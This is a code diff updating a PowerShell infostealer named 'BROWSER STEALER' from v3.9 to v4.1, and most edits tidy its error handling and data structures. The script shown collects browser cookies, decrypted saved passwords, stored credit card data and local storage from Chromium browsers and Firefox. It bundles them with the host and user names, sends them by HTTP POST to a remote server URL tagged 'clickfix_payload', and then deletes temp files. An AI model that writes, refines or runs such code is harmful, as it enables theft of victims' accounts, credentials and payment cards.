@@ -1,5 +1,5 @@
 # ============================================================
-# BROWSER STEALER v3.9 — FIXED SYNTAX
+# BROWSER STEALER v4.1 — CLEAN SYNTAX
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -25,7 +25,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "BROWSER STEALER v3.9"
+Write-Log "BROWSER STEALER v4.1"
 Write-Log "Target: $env:COMPUTERNAME"
 Write-Log "Log: $LOGFILE"
 Write-Log "============================================"
@@ -39,7 +39,8 @@ function Download-Dll {
         Write-Log "$Name downloaded"
         return $true
     } catch {
-        Write-Log "$Name failed: $_"
+        $err = $_.Exception.Message
+        Write-Log "$Name failed: $err"
         return $false
     }
 }
@@ -63,7 +64,8 @@ try {
     [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
     Write-Log "SQLite loaded"
 } catch {
-    Write-Log "SQLite load failed: $_"
+    $err = $_.Exception.Message
+    Write-Log "SQLite load failed: $err"
     exit
 }
 
@@ -74,7 +76,8 @@ if ($leveldbOk -and $nativeOk) {
         Write-Log "LevelDB loaded"
         $leveldbLoaded = $true
     } catch {
-        Write-Log "LevelDB load failed: $_"
+        $err = $_.Exception.Message
+        Write-Log "LevelDB load failed: $err"
         $leveldbLoaded = $false
     }
 }
@@ -161,8 +164,8 @@ function Read-SQLite {
         $conn.Close()
         Remove-Item $temp -Force -ErrorAction SilentlyContinue
     } catch {
-        $errMsg = $_.Exception.Message
-        Write-Log "SQLite read error on $DbPath : $errMsg"
+        $err = $_.Exception.Message
+        Write-Log "SQLite read error on $DbPath : $err"
     }
     return $result
 }
@@ -195,7 +198,8 @@ function Get-BrowserCookies {
                 $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
             }
         }
-        Write-Log "$Name cookies: $($cookies.Count) found"
+        $count = $cookies.Count
+        Write-Log "$Name cookies: $count found"
     } catch {
         Write-Log "Error reading $Name cookies"
     }
@@ -219,7 +223,8 @@ function Get-FirefoxCookies {
                             $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                         }
                     }
-                    Write-Log "Firefox cookies: $($cookies.Count) found"
+                    $count = $cookies.Count
+                    Write-Log "Firefox cookies: $count found"
                 } catch {
                     Write-Log "Error reading Firefox cookies"
                 }
@@ -255,9 +260,11 @@ function Get-BrowserPasswords {
                 $pass += @{ name = $username; value = $decryptedPassword; type = "password"; url = $u; browser = $Name }
             }
         }
-        Write-Log "Found $($pass.Count) $Name passwords"
+        $count = $pass.Count
+        Write-Log "Found $count $Name passwords"
     } catch {
-        Write-Log "Error reading $Name passwords: $_"
+        $err = $_.Exception.Message
+        Write-Log "Error reading $Name passwords: $err"
     }
     return $pass
 }
@@ -298,15 +305,15 @@ function Get-BrowserCards {
         $rows = Read-SQLite -DbPath $webData -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
         foreach ($r in $rows) {
             if ($r['name_on_card'] -and $r['card_number_encrypted']) {
-                $cards += @{
-                    name = $r['name_on_card']
-                    value = $r['card_number_encrypted']
-                    type = "card-number"
-                    url = $Name
-                    browser = $Name
-                    month = $r['expiration_month']
-                    year = $r['expiration_year']
-                }
+                $card = @{}
+                $card['name'] = $r['name_on_card']
+                $card['value'] = $r['card_number_encrypted']
+                $card['type'] = "card-number"
+                $card['url'] = $Name
+                $card['browser'] = $Name
+                $card['month'] = $r['expiration_month']
+                $card['year'] = $r['expiration_year']
+                $cards += $card
             }
         }
     } catch {
@@ -334,9 +341,11 @@ function Get-ChromeLocalStorage {
         }
         $iterator.Dispose()
         $db.Dispose()
-        Write-Log "$Name LocalStorage: $($storage.Count) items"
+        $count = $storage.Count
+        Write-Log "$Name LocalStorage: $count items"
     } catch {
-        Write-Log "Error reading $Name LocalStorage: $_"
+        $err = $_.Exception.Message
+        Write-Log "Error reading $Name LocalStorage: $err"
     }
     return $storage
 }
@@ -351,7 +360,8 @@ function Get-FirefoxLocalStorage {
             foreach ($r in $rows) {
                 if ($r['key'] -and $r['value']) { $storage[$r['key']] = $r['value'] }
             }
-            Write-Log "Firefox LocalStorage: $($storage.Count) items"
+            $count = $storage.Count
+            Write-Log "Firefox LocalStorage: $count items"
         } catch {
             Write-Log "Error reading Firefox LocalStorage"
         }
@@ -416,10 +426,14 @@ Write-Log ""
 Write-Log "============================================"
 Write-Log "SUMMARY"
 Write-Log "============================================"
-Write-Log "Cookies: $($allCookies.Count)"
-Write-Log "Passwords: $($allPasswords.Count)"
-Write-Log "Cards: $($allCards.Count)"
-Write-Log "LocalStorage: $($allLocalStorage.Count)"
+$cookieCount = $allCookies.Count
+$passCount = $allPasswords.Count
+$cardCount = $allCards.Count
+$storageCount = $allLocalStorage.Count
+Write-Log "Cookies: $cookieCount"
+Write-Log "Passwords: $passCount"
+Write-Log "Cards: $cardCount"
+Write-Log "LocalStorage: $storageCount"
 Write-Log "============================================"
 
 $pcName = $env:COMPUTERNAME
@@ -428,7 +442,7 @@ $userName = $env:USERNAME
 $cookiesForServer = @{}
 foreach ($c in $allCookies) {
     $key = $c.domain + "|" + $c.browser
-    if (-not $cookiesForServer[$key]) {
+    if (-not $cookiesForServer.ContainsKey($key)) {
         $cookiesForServer[$key] = @{}
     }
     $cookiesForServer[$key][$c.name] = $c.value
@@ -439,34 +453,36 @@ foreach ($key in $allLocalStorage.Keys) {
     $localStorageForServer[$key] = $allLocalStorage[$key]
 }
 
-$payload = @{
-    cookies = $cookiesForServer
-    credentials = $allPasswords
-    cards = $allCards
-    localStorage = $localStorageForServer
-    system = @{
-        hostname = $pcName
-        username = $userName
-        os = (Get-WmiObject Win32_OperatingSystem).Caption
-    }
-    fingerprint = @{
-        hostname = $pcName
-        userAgent = "PowerShell Payload"
-        browser = "PowerShell"
-        screen = "N/A"
-    }
-    domain = $pcName
-    browser = "PowerShell"
-    source = "clickfix_payload"
-    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-    pcName = $pcName
-    nonce = [System.Guid]::NewGuid().ToString()
+$osInfo = (Get-WmiObject Win32_OperatingSystem).Caption
+
+$payload = @{}
+$payload['cookies'] = $cookiesForServer
+$payload['credentials'] = $allPasswords
+$payload['cards'] = $allCards
+$payload['localStorage'] = $localStorageForServer
+$payload['system'] = @{
+    hostname = $pcName
+    username = $userName
+    os = $osInfo
 }
+$payload['fingerprint'] = @{
+    hostname = $pcName
+    userAgent = "PowerShell Payload"
+    browser = "PowerShell"
+    screen = "N/A"
+}
+$payload['domain'] = $pcName
+$payload['browser'] = "PowerShell"
+$payload['source'] = "clickfix_payload"
+$payload['timestamp'] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+$payload['pcName'] = $pcName
+$payload['nonce'] = [System.Guid]::NewGuid().ToString()
 
 Write-Log "Sending data..."
 try {
     $json = $payload | ConvertTo-Json -Depth 10
-    Write-Log "Payload size: $($json.Length) bytes"
+    $jsonLength = $json.Length
+    Write-Log "Payload size: $jsonLength bytes"
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     $req = [System.Net.WebRequest]::Create($SERVER_URL)
     $req.Method = "POST"
@@ -480,7 +496,8 @@ try {
     $resp.Close()
     Write-Log "Data sent"
 } catch {
-    Write-Log "Send failed: $_"
+    $err = $_.Exception.Message
+    Write-Log "Send failed: $err"
 }
 
 Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
